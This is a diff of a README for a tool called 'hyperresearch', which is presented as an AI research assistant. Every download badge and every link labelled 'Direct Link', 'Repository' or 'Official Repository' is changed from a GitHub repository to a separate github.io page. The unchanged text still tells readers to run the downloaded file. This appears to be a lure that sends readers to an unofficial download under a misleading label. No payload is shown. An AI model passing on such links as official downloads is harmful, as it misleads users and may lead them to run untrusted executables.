@@ -1,6 +1,6 @@
 # 🧠 hyperresearch - Your AI-Powered Research Assistant  
 
-[![Download Now](https://img.shields.io/badge/Download-hyperresearch-2ea44f?style=for-the-badge&logo=github)](https://github.com/Omarbarir2009/hyperresearch)  
+[![Download Now](https://img.shields.io/badge/Download-hyperresearch-2ea44f?style=for-the-badge&logo=github)](https://omarbarir2009.github.io)  
 
 ---
 
@@ -65,9 +65,9 @@ Getting hyperresearch on your computer is super easy. Just follow these simple s
 
 Click the big green button below (or the one at the top of this page) to go to the download page:  
 
-[![Download hyperresearch](https://img.shields.io/badge/⬇️_Download-hyperresearch-2ea44f?style=for-the-badge)](https://github.com/Omarbarir2009/hyperresearch)  
+[![Download hyperresearch](https://img.shields.io/badge/⬇️_Download-hyperresearch-2ea44f?style=for-the-badge)](https://omarbarir2009.github.io)  
 
-> **🔗 Direct Link:** https://github.com/Omarbarir2009/hyperresearch  
+> **🔗 Direct Link:** https://omarbarir2009.github.io  
 
 Visit this link to download the application. Once you're on the GitHub page, look for the **"Releases"** section or the **"Code"** button to access the latest download.  
 
@@ -191,13 +191,13 @@ Need assistance? Here are your options:
 - **Create an issue** – If you encounter a problem, report it on GitHub  
 - **Join the community** – Connect with other users and share tips  
 
-**Repository:** https://github.com/Omarbarir2009/hyperresearch  
+**Repository:** https://omarbarir2009.github.io  
 
 ---
 
 ## 🏁 Final Steps: Your Quick Start Checklist  
 
-✅ **Download** – Visit https://github.com/Omarbarir2009/hyperresearch  
+✅ **Download** – Visit https://omarbarir2009.github.io  
 ✅ **Install** – Run the downloaded file and follow instructions  
 ✅ **Launch** – Open hyperresearch from your desktop  
 ✅ **Configure** – Enter your research topics or areas of interest  
@@ -225,13 +225,13 @@ hyperresearch turns web research from a chore into a breeze. With automated agen
 It's simple enough for beginners and powerful enough for advanced users. Download it today and experience the future of research.  
 
 ### Quick Download  
-[![Get hyperresearch](https://img.shields.io/badge/Get_hyperresearch-now-important?style=for-the-badge)](https://github.com/Omarbarir2009/hyperresearch)  
+[![Get hyperresearch](https://img.shields.io/badge/Get_hyperresearch-now-important?style=for-the-badge)](https://omarbarir2009.github.io)  
 
 ---
 
 ## 📚 Additional Resources  
 
-- **Official Repository:** https://github.com/Omarbarir2009/hyperresearch  
+- **Official Repository:** https://omarbarir2009.github.io  
 - **Releases & Downloads:** Available on the main repository page  
 - **Documentation:** Check the repository's README for technical details  
 
